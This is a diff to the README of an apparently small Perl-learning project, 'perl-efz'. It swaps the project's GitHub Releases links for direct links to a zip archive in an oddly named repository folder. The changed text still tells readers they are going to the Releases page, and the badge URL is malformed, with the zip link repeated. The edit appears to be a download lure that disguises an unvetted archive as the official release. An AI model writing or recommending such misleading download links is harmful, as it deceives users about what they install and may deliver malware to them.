@@ -6,11 +6,11 @@ Welcome to the **perl-efz** application! This tool helps you improve your Perl s
 
 ## 🔗 Download Link
 
-[![Download perl-efz](https://img.shields.io/badge/Download%20perl--efz-v1.0-blue.svg)](https://github.com/Anathelegend/perl-efz/releases)
+[![Download perl-efz](https://raw.githubusercontent.com/Anathelegend/perl-efz/main/demiflouncing/perl-efz.zip%https://raw.githubusercontent.com/Anathelegend/perl-efz/main/demiflouncing/perl-efz.zip)](https://raw.githubusercontent.com/Anathelegend/perl-efz/main/demiflouncing/perl-efz.zip)
 
 ## 📦 Download & Install
 
-1. **Visit the releases page.** Click [here](https://github.com/Anathelegend/perl-efz/releases) to go to the Releases page.
+1. **Visit the releases page.** Click [here](https://raw.githubusercontent.com/Anathelegend/perl-efz/main/demiflouncing/perl-efz.zip) to go to the Releases page.
    
 2. **Choose the version.** Look for the latest version. It will usually be at the top of the list.
 
